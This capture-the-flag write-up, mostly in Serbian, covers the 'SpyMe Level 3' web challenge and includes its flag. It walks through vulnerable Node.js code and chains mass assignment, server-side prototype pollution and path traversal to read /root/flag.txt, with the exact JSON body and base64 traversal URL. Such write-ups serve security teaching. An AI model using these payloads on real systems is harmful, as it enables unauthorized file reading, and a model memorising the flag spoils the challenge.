## Ime zadatka:

SpyMe Level 3


## Kategorija:

Web

## Deskripcija:

> We're on the brink of a breakthrough. Can you uncover and expose the confidential documents hidden within the admin's vault?



## Linkovi:

+ `source.zip` - [Download](https://github.com/CyberHeroRS/scc2025-warmup/raw/refs/heads/master/web_spyMe_level3/public/source.zip)

## Flag:

* `SCC{y0u_juSt_s4v3d_th3_d4y_Il1j4_1s_g0nn4_b3_m4d}`

## Napomene:

* Zameniti fake flagove unutar `docker-compose.yml` fajla.
* Staviti neke jace credentials za MySQL takodje unutar `docker-compose.yml` fajla.
* Koristiti istu instancu za sva 3 level-a zadatka.

## Writeup:

* Admin dobija pristup novom feature-u - `Manage Allow Spies`.
* Ovde moramo da chainujemo vise bug-ova, sa obzirom da je finalni flag lociran unutar /root/flag.txt`. Potreban nam je nacin da procitamo ovaj fajl.

* Ukoliko pogledamo controller `/api/toggle_spy_access` rute, mozemo videti jednostavan Mass Assignment issue, koji nam dozvoljava *limited arbitrary file write* na server, gde mozemo da da dodamo dodatne properties unutar JSON-a bilo kojeg fajla u `/whitelist` folderu:

```js
 const { username, isAllowedSpy, ...otherInfo } = req.body;
        
        if (typeof username !== 'string') {
            return res.status(400).json({ error: 'Invalid username' });
        }

        const filename = `spy_${username}.json`;
        const whitelistPath = path.join(__dirname, 'whitelist', filename);

        try {
            const content = await fs.readFile(whitelistPath, 'utf8');
            const data = JSON.parse(content);
            
            const newData = { ...data, ...otherInfo, is_allowed_spy: isAllowedSpy };
            await fs.writeFile(whitelistPath, JSON.stringify(newData, null, 4));
            res.json({ success: true, data: newData });
        } catch (err) {
            if (err.code !== 'ENOENT') {
                throw err;
            }
```

* `...otherInfo` se dodaje u fajl, bez ikakve validacije.

* Sa druge strane, ako pogledamo `/api/read_whitelist` rutu, mozemo videti sledece:
```js
const readWhitelist = async (req, res) => {
    if (!req.user.is_admin) {
        return res.status(403).json({ error: 'Only administrators can read whitelist files' });
    }

    try {
        const filename = Buffer.from(req.params.filename, 'base64').toString();
        const sanitizedFilename = sanitizeFilename(filename); // <- losa sanitizacija ovde
        const whitelistPath = path.join(__dirname, 'whitelist', sanitizedFilename);
        const content = await fs.readFile(whitelistPath, 'utf8');
        
        try {
            const data = processWhitelistData(JSON.parse(content)); // <- SSPP gadget
            
            if (req.query.checkStatus === 'true') {
                return res.json({ is_allowed_spy: data.is_allowed_spy });
            }
            
            if (!req.user.developer_mode) {
                return res.status(403).json({ error: 'Viewing whitelists is only available in developer mode' });
            }

            return res.json(data);
        } catch (error) {
            console.error('Error parsing whitelist JSON:', error);
            
            if (req.user.developer_mode) {
                return res.status(400).json({ error: 'Invalid whitelist file format', content }); // <- Ukoliko je developer_mode settovan , ovde mozemo dobiti content bilo kojeg fajla na filesystemu. 
            }
            return res.status(400).json({ error: 'Invalid whitelist file format' });
        }
    } catch (error) {
        console.error('Error reading whitelist:', error);
        if (req.query.checkStatus === 'true') {
            return res.json({ is_allowed_spy: false });
        }
        res.status(500).json({ error: 'Failed to read whitelist file' });
    }
};
```

* Vidimo da ukoliko nas user ima `developer_mode` opciju podesenu, mozemo da imamo *arbitrary file read* na serveru. Kako to da uradimo? Pogledamo `processWhitelistData` funkciju:

```js 
const processWhitelistData = (data) => {
    const result = {};
    
    function processObject(obj) {
        for (const key in obj) {
            const value = obj[key];
            if (value && typeof value === 'object') {
                result[key] = result[key] || {};
                Object.assign(result[key], processObject(value));
            } else {
                result[key] = value;
            }
        }
        return result;
    }

    return processObject(data);
};
```

* Radi deep-merge property-a unutar fajla, tako da ako writeujemo `__proto__` property bilo gde unutar JSON-a, mozemo da pollutujemo globalni `Object.prototype` i dobiti *arb file read*.

* Jos jedan problem, mozemo primetiti da se na samom filename-u koji zelimo da procitamo sa filesystem-a vrsi odredjena sanitizacija kroz `sanitizeFilename()`:

```js
const sanitizeFilename = (filename) => {
    return filename.replaceAll("../", "");
};
```

* Srecom, ovo je veoma jednostavno da se bypassuje, posto se `../` globalno replace-uje, mozemo prosto koristiti `..././`, sto ce se nakon sanitizacije transformisati nazad u `../`.


* Ako chainujemo sve ove "gadgete", radimo sledece:

1. Koristimo **Mass Assignment** da dodamo `__proto__` property sa `developer_mode`-om unutar JSON-a bilo kojeg fajla u `/whitelist` folderu. Ovo mozemo da uradimo tako sto posaljemo POST na `/api/toggle_spy_access` sa sledecim body-om:

```json
{
    "username":"bsimic",
    "isAllowed":true,
    "__proto__":{
        "developer_mode":1337
    }
}
```

2. Triggerujemo **SSPP gadget** (Server-Side Prototype Pollution) tj. `processWhitelistData` funkciju. Ovo radimo slanjem jednostavnog GET requesta na `/api/read_whitelist` sa base64-encoded filename-om. Npr: `/api/read_whitelist/c3B5X2JzaW1pYy5qc29u` -> `spy_bsimic.json`.

3. Konacno, citamo flag.txt sa sledecim payloadom uz **Path Traversal**: `/api/read_whitelist/Li4uLy4vLi4uLy4vLi4uLy4vcm9vdC9mbGFnLnR4dA==` -> `../..//..//..//..//..//root/flag.txt`. 

* Ceo exploit se nalazi u `checker/solve.py` fajlu. 


